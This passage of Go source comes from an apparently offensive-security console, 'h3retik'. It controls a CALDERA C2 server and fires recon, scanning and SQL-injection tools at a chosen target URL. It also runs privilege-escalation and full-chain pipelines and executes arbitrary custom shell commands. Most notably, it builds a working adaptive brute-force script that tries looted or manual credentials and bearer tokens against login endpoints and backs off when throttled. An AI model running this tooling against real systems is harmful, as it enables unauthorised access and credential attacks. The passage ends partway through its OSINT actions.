			Command:     "coop:tutorial:show",
		},
		controlAction{
			Label:       "[COOP] Start CALDERA C2",
			Description: "Start CALDERA service in Kali if not already running.",
			Mode:        "kali",
			Command:     kaliExecCommand(envPrefix + " coop-caldera-up"),
			KaliShell:   envPrefix + " coop-caldera-up",
		},
		controlAction{
			Label:       "[COOP] CALDERA Status",
			Description: "Check C2 process, endpoint, and API response health.",
			Mode:        "kali",
			Command:     kaliExecCommand(envPrefix + " coop-caldera-status"),
			KaliShell:   envPrefix + " coop-caldera-status",
		},
		controlAction{
			Label:       "[COOP] List Agents",
			Description: "Pull `/api/agents` via CALDERA API key.",
			Mode:        "kali",
			Command:     kaliExecCommand(envPrefix + " coop-caldera-api /api/agents GET"),
			KaliShell:   envPrefix + " coop-caldera-api /api/agents GET",
		},
		controlAction{
			Label:       "[COOP] List Operations",
			Description: "Pull `/api/operations` and show active operation set.",
			Mode:        "kali",
			Command:     kaliExecCommand(envPrefix + " coop-caldera-api /api/operations GET"),
			KaliShell:   envPrefix + " coop-caldera-api /api/operations GET",
		},
		controlAction{
			Label:       "[COOP] Pull Operation Snapshot",
			Description: "Persist agent+operation snapshot artifact for shared ops context.",
			Mode:        "kali",
			Command:     kaliExecCommand(envPrefix + " coop-caldera-op-report"),
			KaliShell:   envPrefix + " coop-caldera-op-report",
		},
		controlAction{
			Label:       "[COOP] Stop CALDERA C2",
			Description: "Stop CALDERA process in Kali.",
			Mode:        "kali",
			Command:     kaliExecCommand(envPrefix + " coop-caldera-stop"),
			KaliShell:   envPrefix + " coop-caldera-stop",
		},
		controlAction{
			Label:       "[COOP] Profile",
			Description: "operation=" + op + " group=" + group + " (profile snapshot)",
			Mode:        "internal",
			Command:     "noop",
		},
	)
	return actions
}

func exploitFireGroups() []string {
	return []string{"Recon", "Surface", "Exploit", "Access", "Privilege", "Objective", "Utility", "Modules", "Custom"}
}

func (m model) selectedExploitFireGroup() string {
	groups := exploitFireGroups()
	if len(groups) == 0 {
		return "Recon"
	}
	return groups[clamp(m.exploitFireGroupIdx, 0, len(groups)-1)]
}

func requirementReady(req string, snap chainSnapshot) bool {
	switch strings.ToLower(strings.TrimSpace(req)) {
	case "recon":
		return snap.Recon
	case "breach":
		return snap.Breach
	case "access":
		return snap.Access
	case "exfil":
		return snap.Exfil
	case "tamper":
		return snap.Tamper
	case "privesc":
		return snap.PrivEsc
	default:
		return true
	}
}

func requirementsReady(requirements []string, snap chainSnapshot) (bool, string) {
	if len(requirements) == 0 {
		return true, ""
	}
	missing := make([]string, 0, len(requirements))
	for _, req := range requirements {
		if !requirementReady(req, snap) {
			missing = append(missing, strings.ToUpper(req))
		}
	}
	if len(missing) == 0 {
		return true, ""
	}
	return false, "requires " + strings.Join(missing, ", ")
}

func (m model) requiredKaliTool(action controlAction) string {
	if !strings.EqualFold(strings.TrimSpace(action.Mode), "kali") {
		return ""
	}
	return firstShellCommandToken(action.KaliShell)
}

func (m model) kaliPreflight(action controlAction) (bool, string) {
	if !kaliRuntimeRunningCached(kaliContainerName()) {
		return false, "kali container " + kaliContainerName() + " is not running"
	}
	requiredTool := m.requiredKaliTool(action)
	if strings.TrimSpace(requiredTool) == "" {
		return true, ""
	}
	available, probeErr := kaliToolAvailableCached(kaliContainerName(), requiredTool)
	if probeErr != nil {
		return false, "kali tool check failed: " + probeErr.Error()
	}
	if !available {
		return false, "missing kali tool: " + requiredTool
	}
	return true, ""
}

func (m *model) preflightControlAction(action controlAction) (bool, string) {
	if action.Mode == "internal" {
		return true, ""
	}
	warning := ""
	if strings.TrimSpace(action.ModuleID) != "" {
		mod, ok := m.attackModuleByID(action.ModuleID)
		if ok {
			missing := []string{}
			for _, input := range mod.Inputs {
				key := strings.TrimSpace(input.Key)
				if key == "" {
					continue
				}
				value := strings.TrimSpace(m.moduleInputValues[m.moduleInputStorageKey(mod.ID, key)])
				if value == "" {
					value = strings.TrimSpace(input.DefaultValue)
				}
				validated, err := validateModuleInputValue(input, value)
				if err != nil {
					missing = append(missing, strings.ToUpper(key)+" ("+err.Error()+")")
					continue
				}
				if input.Required && strings.TrimSpace(validated) == "" {
					missing = append(missing, strings.ToUpper(key))
				}
			}
			if len(missing) > 0 {
				return false, "module inputs missing: " + strings.Join(missing, ", ")
			}
		}
	}
	if strings.EqualFold(strings.TrimSpace(action.ActionID), "bruteforce-adaptive") {
		if strings.TrimSpace(m.effectiveExploitTargetURL()) == "" {
			return false, "no active target endpoint selected"
		}
		if len(m.bruteCredentialCandidates()) == 0 && strings.TrimSpace(m.selectedBruteToken()) == "" {
			return false, "no credential or token source configured"
		}
		warning = strings.TrimSpace(m.brutePreflightWarning(m.effectiveExploitTargetURL()))
	}
	snap := deriveChainSnapshot(m.commands, m.findings, m.loot)
	if ok, reason := requirementsReady(action.Requires, snap); !ok {
		return false, reason
	}
	if action.Mode == "local" && len(action.Args) > 0 {
		if _, err := exec.LookPath(action.Args[0]); err != nil {
			return false, "missing local binary: " + action.Args[0]
		}
	}
	if action.Mode == "kali" {
		if ok, reason := m.kaliPreflight(action); !ok {
			return false, reason
		}
		if requiresCoopAPIRuntime(action) {
			if ok, reason := coopAPIRuntimeReady(kaliContainerName()); !ok {
				return false, reason
			}
		}
		return true, warning
	}
	return true, warning
}

func requiresCoopAPIRuntime(action controlAction) bool {
	meta := strings.ToLower(strings.TrimSpace(action.KaliShell + " " + action.Command + " " + action.Label + " " + action.ActionID))
	return strings.Contains(meta, "coop-caldera-api")
}

func coopAPIRuntimeReady(container string) (bool, string) {
	container = strings.TrimSpace(container)
	if container == "" {
		return false, "co-op runtime check failed: missing kali container"
	}
	ctx, cancel := context.WithTimeout(context.Background(), 6*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "docker", "exec", container, "bash", "-lc", "coop-caldera-status >/dev/null 2>&1")
	if err := cmd.Run(); err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return false, "co-op runtime check timed out (start CALDERA C2 first)"
		}
		return false, "co-op CALDERA API unavailable (run [COOP] Start CALDERA C2)"
	}
	return true, ""
}

func actionDone(action controlAction, commands []commandEntry) bool {
	needle := strings.ToLower(strings.TrimSpace(action.ActionID))
	if needle == "" {
		return false
	}
	for _, cmd := range commands {
		if commandMatchesAction(cmd, needle) && isSuccessStatus(cmd.Status, cmd.ExitCode) {
			return true
		}
	}
	return false
}

func commandMatchesAction(cmd commandEntry, actionNeedle string) bool {
	needle := strings.ToLower(strings.TrimSpace(actionNeedle))
	if needle == "" {
		return false
	}
	meta := strings.ToLower(cmd.Command + " " + cmd.Tool + " " + cmd.OutputPreview + " " + cmd.Phase)
	return strings.Contains(meta, needle)
}

func (m model) customFireActions(mode string) []controlAction {
	mode = strings.ToLower(strings.TrimSpace(mode))
	if mode == "" {
		mode = "exploit"
	}
	command := m.activeCustomCommand(mode)
	runtime := m.activeCustomRuntime()
	if strings.TrimSpace(command) == "" {
		command = "echo 'set a custom command first'"
	}
	runAction := controlAction{
		Label:       "[CUSTOM] Run (" + strings.ToUpper(runtime) + ")",
		Description: "Run the current custom command in selected runtime.",
		Mode:        "kali",
		Command:     "docker exec h3retik-kali bash -lc \"" + command + "\"",
		KaliShell:   command,
	}
	if runtime == "local" {
		runAction = controlAction{
			Label:       "[CUSTOM] Run (LOCAL)",
			Description: "Run the current custom command on host runtime.",
			Mode:        "local",
			Command:     "bash -lc \"" + command + "\"",
			Args:        []string{"bash", "-lc", command},
		}
	}
	return []controlAction{
		{
			Label:       "[CUSTOM] Edit Command (Type)",
			Description: "Type and save custom command for current workflow mode.",
			Mode:        "internal",
			Command:     "custom:edit",
		},
		{
			Label:       "[CUSTOM] Runtime: " + strings.ToUpper(runtime) + " (Cycle)",
			Description: "Toggle execution runtime between Kali and local host.",
			Mode:        "internal",
			Command:     "custom:runtime:next",
		},
		{
			Label:       "[CUSTOM] Load Template (Cycle)",
			Description: "Load next mode-specific template into custom command input.",
			Mode:        "internal",
			Command:     "custom:template:next",
		},
		runAction,
	}
}

func (m model) exploitFireActions() []controlAction {
	targetURL := strings.TrimSpace(m.effectiveExploitTargetURL())
	if targetURL == "" {
		return []controlAction{
			{
				Label:       "Target Required",
				Description: "Set active target URL in CTRL TARGET before exploit FIRE actions.",
				Mode:        "internal",
				Command:     "target:manual-url",
				Group:       "Recon",
			},
		}
	}
	baseURL := strings.TrimRight(targetURL, "/")
	catalog := []controlAction{
		{
			Label:       "[PRELIM] HTTP Headers Probe",
			Description: "Fire a quick HEAD request against active target URL.",
			Mode:        "local",
			Command:     "curl -sSI " + targetURL,
			Args:        []string{"curl", "-sSI", targetURL},
			ActionID:    "curl -ssi",
			Group:       "Recon",
		},
		{
			Label:       "[PRELIM] Target Root Fetch",
			Description: "Fetch target root response and headers.",
			Mode:        "local",
			Command:     "curl -sS " + targetURL,
			Args:        []string{"curl", "-sS", targetURL},
			ActionID:    "curl -ss",
			Group:       "Recon",
		},
		{
			Label:       "[PIPELINE] Quick Scan",
			Description: "Run lightweight modular scan profile on active target URL.",
			Mode:        "local",
			Command:     "python3 ./scripts/security_pipeline.py --target " + targetURL + " --profile quick",
			Args:        []string{"python3", "./scripts/security_pipeline.py", "--target", targetURL, "--profile", "quick"},
			ActionID:    "--profile quick",
			Group:       "Surface",
		},
		{
			Label:       "[PIPELINE] Deep Scan",
			Description: "Run full-depth modular scan profile with extended tooling where available.",
			Mode:        "local",
			Command:     "python3 ./scripts/security_pipeline.py --target " + targetURL + " --profile deep",
			Args:        []string{"python3", "./scripts/security_pipeline.py", "--target", targetURL, "--profile", "deep"},
			ActionID:    "--profile deep",
			Group:       "Surface",
		},
		{
			Label:       "[WEB] Nuclei Sweep",
			Description: "Run nuclei template sweep directly against current target.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc " + shellQuote("nuclei -u "+targetURL+" -silent"),
			KaliShell:   "nuclei -u " + targetURL + " -silent",
			ActionID:    "nuclei",
			Group:       "Surface",
		},
		{
			Label:       "[WEB] Nikto Audit",
			Description: "Run nikto web scan against current target.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc " + shellQuote("nikto -h "+targetURL),
			KaliShell:   "nikto -h " + targetURL,
			ActionID:    "nikto",
			Group:       "Surface",
		},
		{
			Label:       "[WEB] FFUF Common Paths",
			Description: "Enumerate common web paths with ffuf.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc " + shellQuote("ffuf -u "+baseURL+"/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401,403"),
			KaliShell:   "ffuf -u " + baseURL + "/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401,403",
			ActionID:    "ffuf",
			Group:       "Surface",
		},
		{
			Label:       "[WEB] Gobuster Dir",
			Description: "Enumerate directories with gobuster.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc " + shellQuote("gobuster dir -u "+baseURL+" -w /usr/share/wordlists/dirb/common.txt -q"),
			KaliShell:   "gobuster dir -u " + baseURL + " -w /usr/share/wordlists/dirb/common.txt -q",
			ActionID:    "gobuster",
			Group:       "Surface",
		},
		{
			Label:       "[API] OPTIONS Method Probe",
			Description: "Probe allowed methods on target root with HTTP OPTIONS.",
			Mode:        "local",
			Command:     "curl -sSI -X OPTIONS " + targetURL,
			Args:        []string{"curl", "-sSI", "-X", "OPTIONS", targetURL},
			ActionID:    "-x options",
			Group:       "Exploit",
			Requires:    []string{"recon"},
		},
		{
			Label:       "[API] OpenAPI Probe",
			Description: "Probe /openapi.json exposure.",
			Mode:        "local",
			Command:     "curl -sS " + baseURL + "/openapi.json",
			Args:        []string{"curl", "-sS", baseURL + "/openapi.json"},
			ActionID:    "/openapi.json",
			Group:       "Exploit",
			Requires:    []string{"recon"},
		},
	}
	host, port := nmapHostPortFromURL(valueOr(m.state.DockerTarget, targetURL))
	nmapShell := "nmap -sV -Pn "
	if port != "" {
		nmapShell += "-p " + port + " "
	}
	nmapShell += host
	catalog = append(catalog, controlAction{
		Label:       "[KALI] Nmap Quickscan",
		Description: "Run quick service discovery from h3retik-kali against current target host.",
		Mode:        "kali",
		Command:     "docker exec h3retik-kali bash -lc \"" + nmapShell + "\"",
		KaliShell:   nmapShell,
		ActionID:    "nmap",
		Group:       "Recon",
	})
	catalog = append(catalog, controlAction{
		Label:       "[KALI] SQLMap Crawl",
		Description: "Run SQLMap crawl against current target URL.",
		Mode:        "kali",
		Command:     "docker exec h3retik-kali bash -lc \"sqlmap -u " + targetURL + " --batch --crawl=2 --risk=1 --level=1\"",
		KaliShell:   "sqlmap -u " + targetURL + " --batch --crawl=2 --risk=1 --level=1",
		ActionID:    "sqlmap",
		Group:       "Exploit",
		Requires:    []string{"recon"},
	})
	credPairs := extractCredentialPairsFromLoot(lootByMode(m.loot, "exploit"))
	selectedLootCred := credentialPair{}
	if len(credPairs) > 0 {
		selectedLootCred = credPairs[clampWrap(m.exploitBruteLootCredIdx, len(credPairs))]
	}
	lootCredLabel := "none"
	if strings.TrimSpace(selectedLootCred.User) != "" {
		lootCredLabel = selectedLootCred.User + ":***"
	}
	bruteTarget := strings.TrimSpace(targetURL)
	bruteWarning := strings.TrimSpace(m.brutePreflightWarning(bruteTarget))
	bruteRunLabel := "[BRUTE] Run Adaptive Endpoint Attack"
	bruteRunDesc := "Runs endpoint attack with response-inferred pacing. OPSEC: high trace (auth + repeated requests)."
	if bruteWarning != "" {
		bruteRunLabel += " [WARN]"
		bruteRunDesc += " Preflight warning: " + truncate(bruteWarning, 132)
	}
	catalog = append(catalog,
		controlAction{
			Label:       "[BRUTE] Cred Source: " + strings.ToUpper(m.selectedBruteCredentialSource()) + " (Cycle)",
			Description: "INFERRED adapts from loot/manual and target responses; LOOT/MANUAL/HYBRID pin sources.",
			Mode:        "internal",
			Command:     "brute:cred-source:next",
			Group:       "Access",
		},
		controlAction{
			Label:       "[BRUTE] Auth Mode: " + strings.ToUpper(m.selectedBruteAuthMode()) + " (Cycle)",
			Description: "AUTO infers best auth path (basic/form/bearer) from endpoint behavior.",
			Mode:        "internal",
			Command:     "brute:auth-mode:next",
			Group:       "Access",
		},
		controlAction{
			Label:       "[BRUTE] Loot Credential: " + lootCredLabel + " (Cycle)",
			Description: "Manually select exact loot credential pair instead of blind auto-selection.",
			Mode:        "internal",
			Command:     "brute:loot-cred:next",
			Group:       "Access",
		},
		controlAction{
			Label:       "[BRUTE] Manual Credential (Type user:pass)",
			Description: "Inject operator-provided credential pair discovered outside current loot.",
			Mode:        "internal",
			Command:     "brute:manual-cred",
			Group:       "Access",
		},
		controlAction{
			Label:       "[BRUTE] Manual Bearer Token (Type)",
			Description: "Inject operator-provided bearer token for boundary checks.",
			Mode:        "internal",
			Command:     "brute:manual-token",
			Group:       "Access",
		},
		controlAction{
			Label:       bruteRunLabel,
			Description: bruteRunDesc,
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc " + shellQuote(m.bruteforceAdaptiveShell(bruteTarget)),
			KaliShell:   m.bruteforceAdaptiveShell(bruteTarget),
			ActionID:    "bruteforce-adaptive",
			Group:       "Access",
		},
	)
	catalog = append(catalog,
		controlAction{
			Label:       "[PRIV] Full Escalation Pipeline",
			Description: "Run escalation-oriented chain once breach/access foothold exists.",
			Mode:        "local",
			Command:     "python3 ./scripts/security_pipeline.py --target " + targetURL + " --pipeline full-escalation",
			Args:        []string{"python3", "./scripts/security_pipeline.py", "--target", targetURL, "--pipeline", "full-escalation"},
			ActionID:    "--pipeline full-escalation",
			Group:       "Privilege",
			Requires:    []string{"breach"},
		},
		controlAction{
			Label:       "[PRIV] PrivEsc Pipeline",
			Description: "Run dedicated privilege escalation workflow.",
			Mode:        "local",
			Command:     "python3 ./scripts/security_pipeline.py --target " + targetURL + " --pipeline privesc",
			Args:        []string{"python3", "./scripts/security_pipeline.py", "--target", targetURL, "--pipeline", "privesc"},
			ActionID:    "--pipeline privesc",
			Group:       "Privilege",
			Requires:    []string{"access"},
		},
		controlAction{
			Label:       "[OBJECTIVE] Full Chain",
			Description: "Execute complete operation chain when prerequisites are covered.",
			Mode:        "local",
			Command:     "python3 ./scripts/security_pipeline.py --target " + targetURL + " --pipeline full-chain",
			Args:        []string{"python3", "./scripts/security_pipeline.py", "--target", targetURL, "--pipeline", "full-chain"},
			ActionID:    "--pipeline full-chain",
			Group:       "Objective",
			Requires:    []string{"recon", "breach"},
		},
		controlAction{
			Label:       "[UTILITY] Tool Inventory",
			Description: "List installed and callable tools for preflight troubleshooting.",
			Mode:        "local",
			Command:     "python3 ./scripts/security_pipeline.py --list-tools",
			Args:        []string{"python3", "./scripts/security_pipeline.py", "--list-tools"},
			ActionID:    "--list-tools",
			Group:       "Utility",
		},
	)
	if len(m.commands) > 0 {
		cmd := m.commands[m.commandIdx].Command
		catalog = append(catalog, controlAction{
			Label:       "[REPLAY] Selected OPS Command",
			Description: "Fire the currently selected command from OPS timeline inside h3retik-kali.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"" + cmd + "\"",
			KaliShell:   cmd,
			ActionID:    strings.ToLower(strings.TrimSpace(cmd)),
			Group:       "Utility",
		})
	}
	group := m.selectedExploitFireGroup()
	actions := []controlAction{}
	snap := deriveChainSnapshot(m.commands, m.findings, m.loot)
	if strings.EqualFold(group, "Modules") {
		for _, mod := range m.attackModules {
			if !strings.EqualFold(strings.TrimSpace(mod.Mode), "exploit") {
				continue
			}
			if len(mod.Inputs) > 0 {
				actions = append(actions, controlAction{
					Label:       "[MODULE] Configure :: " + mod.Label,
					Description: fmt.Sprintf("Configure %d input fields for this module.", len(mod.Inputs)),
					Mode:        "internal",
					Command:     "module:configure:" + mod.ID,
					ModuleID:    mod.ID,
				})
			}
			action := m.moduleToAction(mod)
			done := actionDone(action, m.commands)
			ready, reason := requirementsReady(action.Requires, snap)
			state := "READY"
			if done {
				state = "DONE"
			} else if !ready {
				state = "LOCKED"
			}
			action.Label = action.Label + " [" + state + "]"
			if !ready && strings.TrimSpace(reason) != "" {
				action.Description = action.Description + " (" + reason + ")"
			}
			actions = append(actions, action)
		}
		if len(actions) == 0 {
			actions = append(actions, controlAction{
				Label:       "No attack modules loaded",
				Description: "Add *.json files under modules/exploit to enable modular attack actions.",
				Mode:        "internal",
				Command:     "noop",
			})
		}
		return actions
	}
	if m.exploitPipelineMenu {
		actions = append(actions, controlAction{
			Label:       "[MENU] Back To Fire Options",
			Description: "Return to fire commands for this category.",
			Mode:        "internal",
			Command:     "fire:pipelines:close",
			Group:       group,
		})
		for _, pipelineName := range pipelineNamesForFireGroup(group) {
			spec := pipelineByName(pipelineName)
			actions = append(actions, controlAction{
				Label:       "[PIPELINE] " + selectedPipelineLabel(pipelineName),
				Description: spec.Summary,
				Mode:        "local",
				Command:     "python3 ./scripts/security_pipeline.py --target " + targetURL + " --pipeline " + pipelineName,
				Args:        []string{"python3", "./scripts/security_pipeline.py", "--target", targetURL, "--pipeline", pipelineName},
				ActionID:    "--pipeline " + pipelineName,
				Requires:    pipelineRequirements(pipelineName),
				Group:       group,
			})
		}
		return actions
	}
	if !strings.EqualFold(group, "Custom") {
		actions = append(actions, controlAction{
			Label:       "[MENU] Pipelines",
			Description: "Open pipeline selector for " + strings.ToUpper(group) + " and run with Enter.",
			Mode:        "internal",
			Command:     "fire:pipelines:open",
			Group:       group,
		})
	}
	if strings.EqualFold(group, "Custom") {
		actions = append(actions, m.customFireActions("exploit")...)
	}
	for _, action := range catalog {
		if !strings.EqualFold(action.Group, group) {
			continue
		}
		done := actionDone(action, m.commands)
		ready, reason := requirementsReady(action.Requires, snap)
		state := "READY"
		if done {
			state = "DONE"
		} else if !ready {
			state = "LOCKED"
		}
		labeled := action
		labeled.Label = action.Label + " [" + state + "]"
		if !ready && strings.TrimSpace(reason) != "" {
			labeled.Description = action.Description + " (" + reason + ")"
		}
		actions = append(actions, labeled)
	}
	if len(actions) <= 1 && !strings.EqualFold(group, "Custom") {
		actions = append(actions, controlAction{
			Label:       "No actions in group",
			Description: "No local commands in this fire category yet.",
			Mode:        "internal",
			Command:     "noop",
		})
	}
	return actions
}

func (m model) selectedLootCredentialPair() (credentialPair, bool) {
	pairs := extractCredentialPairsFromLoot(lootByMode(m.loot, "exploit"))
	if len(pairs) == 0 {
		return credentialPair{}, false
	}
	idx := clampWrap(m.exploitBruteLootCredIdx, len(pairs))
	return pairs[idx], true
}

func (m model) bruteCredentialCandidates() []credentialPair {
	source := strings.ToLower(strings.TrimSpace(m.selectedBruteCredentialSource()))
	lootPairs := extractCredentialPairsFromLoot(lootByMode(m.loot, "exploit"))
	selectedLoot, hasLoot := m.selectedLootCredentialPair()
	manual := credentialPair{
		User: strings.TrimSpace(m.exploitBruteManualUser),
		Pass: strings.TrimSpace(m.exploitBruteManualPass),
	}
	out := []credentialPair{}
	seen := map[string]bool{}
	add := func(pair credentialPair) {
		user := strings.TrimSpace(pair.User)
		pass := strings.TrimSpace(pair.Pass)
		if user == "" || pass == "" {
			return
		}
		key := strings.ToLower(user + "|" + pass)
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, credentialPair{User: user, Pass: pass})
	}
	switch source {
	case "loot":
		if hasLoot {
			add(selectedLoot)
		}
		if len(out) == 0 {
			for _, pair := range lootPairs {
				add(pair)
			}
		}
	case "manual":
		add(manual)
	case "hybrid":
		if hasLoot {
			add(selectedLoot)
		}
		add(manual)
		if len(out) == 0 {
			for _, pair := range lootPairs {
				add(pair)
			}
		}
	default:
		if hasLoot {
			add(selectedLoot)
		}
		add(manual)
		if len(out) == 0 {
			for _, pair := range lootPairs {
				add(pair)
				if len(out) >= 8 {
					break
				}
			}
		}
	}
	return out
}

func (m model) selectedBruteToken() string {
	manual := strings.TrimSpace(m.exploitBruteManualToken)
	source := strings.ToLower(strings.TrimSpace(m.selectedBruteCredentialSource()))
	switch source {
	case "manual":
		return manual
	case "loot":
		if manual != "" {
			return manual
		}
		return strings.TrimSpace(latestTokenFromTelemetry(m.root))
	default:
		if manual != "" {
			return manual
		}
		return strings.TrimSpace(latestTokenFromTelemetry(m.root))
	}
}

func (m model) bruteforceAdaptiveShell(target string) string {
	endpoint := strings.TrimSpace(target)
	if endpoint == "" {
		return "echo \"BRUTE_RESULT status=blocked reason=missing-target\"; exit 1"
	}
	source := strings.ToLower(strings.TrimSpace(m.selectedBruteCredentialSource()))
	authMode := strings.ToLower(strings.TrimSpace(m.selectedBruteAuthMode()))
	token := strings.TrimSpace(m.selectedBruteToken())
	pairs := m.bruteCredentialCandidates()
	pairArgs := make([]string, 0, len(pairs))
	for _, pair := range pairs {
		pairArgs = append(pairArgs, shellQuote(pair.User+":"+pair.Pass))
	}
	pairsStmt := "pairs=''"
	if len(pairArgs) > 0 {
		pairsStmt = "pairs=$(printf '%s\\n' " + strings.Join(pairArgs, " ") + ")"
	}
	script := strings.Join([]string{
		"endpoint=" + shellQuote(endpoint),
		"cred_source=" + shellQuote(source),
		"auth_mode=" + shellQuote(authMode),
		"token=" + shellQuote(token),
		pairsStmt,
		"baseline=$(curl -sS -k -o /dev/null -w '%{http_code}' \"$endpoint\")",
		"delay=0; hits=0; tries=0",
		"echo \"BRUTE_BASE endpoint=$endpoint baseline=$baseline source=$cred_source mode=$auth_mode\"",
		"if [ -z \"$pairs\" ] && [ -z \"$token\" ]; then echo \"BRUTE_RESULT status=no-creds endpoint=$endpoint\"; exit 1; fi",
		"if [ -n \"$pairs\" ]; then",
		"while IFS= read -r pair; do",
		"  [ -z \"$pair\" ] && continue",
		"  user=\"${pair%%:*}\"; pass=\"${pair#*:}\"",
		"  methods=\"$auth_mode\"; [ \"$auth_mode\" = \"auto\" ] && methods='basic form bearer'",
		"  for method in $methods; do",
		"    tries=$((tries+1)); code=''",
		"    if [ \"$method\" = 'basic' ]; then",
		"      code=$(curl -sS -k -o /dev/null -w '%{http_code}' -u \"$user:$pass\" \"$endpoint\")",
		"    elif [ \"$method\" = 'form' ]; then",
		"      code=$(curl -sS -k -o /dev/null -w '%{http_code}' -X POST \"$endpoint\" -H 'Content-Type: application/x-www-form-urlencoded' --data \"username=$user&password=$pass\")",
		"      if [ -z \"$code\" ] || [ \"$code\" = \"$baseline\" ]; then code=$(curl -sS -k -o /dev/null -w '%{http_code}' -X POST \"$endpoint\" -H 'Content-Type: application/json' --data \"{\\\"username\\\":\\\"$user\\\",\\\"password\\\":\\\"$pass\\\"}\"); fi",
		"      if [ -z \"$code\" ] || [ \"$code\" = \"$baseline\" ]; then code=$(curl -sS -k -o /dev/null -w '%{http_code}' -X POST \"$endpoint\" -H 'Content-Type: application/x-www-form-urlencoded' --data \"email=$user&password=$pass\"); fi",
		"    elif [ \"$method\" = 'bearer' ] && [ -n \"$token\" ]; then",
		"      code=$(curl -sS -k -o /dev/null -w '%{http_code}' \"$endpoint\" -H \"Authorization: Bearer $token\")",
		"    fi",
		"    [ -z \"$code\" ] && continue",
		"    echo \"BRUTE_TRY endpoint=$endpoint method=$method user=$user code=$code baseline=$baseline\"",
		"    if [ \"$code\" = '429' ] || [ \"$code\" = '503' ]; then if [ \"$delay\" -lt 6 ]; then delay=$((delay+1)); fi; echo \"THROTTLE_INFERRED endpoint=$endpoint delay=${delay}s code=$code\";",
		"    elif [ \"$delay\" -gt 0 ]; then delay=$((delay-1)); fi",
		"    [ \"$delay\" -gt 0 ] && sleep \"$delay\"",
		"    if [ \"$code\" -ge 200 ] 2>/dev/null && [ \"$code\" -lt 400 ] 2>/dev/null && [ \"$code\" != \"$baseline\" ]; then",
		"      hits=$((hits+1)); echo \"BRUTE_HIT endpoint=$endpoint method=$method user=$user code=$code baseline=$baseline source=$cred_source\"; break",
		"    fi",
		"  done",
		"done <<< \"$pairs\"",
		"fi",
		"if [ -n \"$token\" ] && { [ \"$auth_mode\" = 'bearer' ] || [ \"$auth_mode\" = 'auto' ]; }; then",
		"  tries=$((tries+1)); code=$(curl -sS -k -o /dev/null -w '%{http_code}' \"$endpoint\" -H \"Authorization: Bearer $token\")",
		"  echo \"BRUTE_TRY endpoint=$endpoint method=bearer user=token code=$code baseline=$baseline\"",
		"  if [ \"$code\" = '429' ] || [ \"$code\" = '503' ]; then if [ \"$delay\" -lt 6 ]; then delay=$((delay+1)); fi; echo \"THROTTLE_INFERRED endpoint=$endpoint delay=${delay}s code=$code\"; fi",
		"  if [ \"$code\" -ge 200 ] 2>/dev/null && [ \"$code\" -lt 400 ] 2>/dev/null && [ \"$code\" != \"$baseline\" ]; then",
		"    hits=$((hits+1)); echo \"BRUTE_HIT endpoint=$endpoint method=bearer user=token code=$code baseline=$baseline source=$cred_source\"",
		"  fi",
		"fi",
		"if [ \"$hits\" -gt 0 ]; then echo \"BRUTE_RESULT status=hit endpoint=$endpoint hits=$hits tries=$tries\"; exit 0; fi",
		"echo \"BRUTE_RESULT status=miss endpoint=$endpoint hits=0 tries=$tries\"; exit 1",
	}, "; ")
	return script
}

func (m model) osintFireActions() []controlAction {
	seed := strings.TrimSpace(m.osintTargetInput)
	if seed == "" {
		targetURL := strings.TrimSpace(m.state.TargetURL)
		seed = strings.TrimSpace(targetHostFromURL(targetURL))
		if seed == "" {
			seed = targetURL
		}
	}
	if strings.TrimSpace(seed) == "" {
		seed = "example.com"
	}
	seedQuoted := shellQuote(seed)
	reconCmd := "modules load recon/domains-hosts/bing_domain_web; options set SOURCE " + seedQuoted + "; run"
	reconCmdQuoted := shellQuote(reconCmd)
	deepEngine := m.selectedOsintDeepEngine()
	deepCmdPreferred := "osint-deep-bbot " + seedQuoted
	if strings.EqualFold(deepEngine, "spiderfoot") {
		deepCmdPreferred = "osint-deep-spiderfoot " + seedQuoted
	}
	fullChain := "target=" + seedQuoted + "; osint-seed-harvest \"$target\" 200; " + deepCmdPreferred + "; osint-reconng " + reconCmdQuoted + "; osint-rengine local-status"
	actions := []controlAction{
		{
			Label:       "[MENU] Deep Engine: " + strings.ToUpper(deepEngine),
			Description: "Switch OSINT deep automation engine to next option.",
			Mode:        "internal",
			Command:     "osint:deep:next",
		},
		{
			Label:       "[OSINT] Full Chain",
			Description: "Run stage chain: seed harvest -> deep automation -> recon-ng -> reNgine.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"" + fullChain + "\"",
			KaliShell:   fullChain,
		},
		{
			Label:       "[OSINT] 1/5 Seed :: theHarvester (" + strings.ToUpper(m.selectedOsintInputType()) + ")",
			Description: "Run theHarvester wrapper for initial seed collection.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"osint-seed-harvest " + seedQuoted + " 200\"",
			KaliShell:   "osint-seed-harvest " + seedQuoted + " 200",
		},
		{
			Label:       "[OSINT] 2/5 Deep (" + strings.ToUpper(deepEngine) + ")",
			Description: "Run selected deep automation engine.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"" + deepCmdPreferred + "\"",
			KaliShell:   deepCmdPreferred,
		},
		{
			Label:       "[OSINT] 3/5 Recon-ng Custom Modules",
			Description: "Execute recon-ng custom module chain against the current seed.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"osint-reconng " + reconCmdQuoted + "\"",
			KaliShell:   "osint-reconng " + reconCmdQuoted,
		},
		{
			Label:       "[OSINT] 4/5 reNgine Runtime/API Check",
			Description: "Validate reNgine local scaffold inside Kali image.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"osint-rengine local-status\"",
			KaliShell:   "osint-rengine local-status",
		},
		{
			Label:       "[OSINT] Artifact Index",
			Description: "List collected OSINT artifacts paths mapped to host volume.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"find /artifacts/osint -maxdepth 3 -type f 2>/dev/null | sort\"",
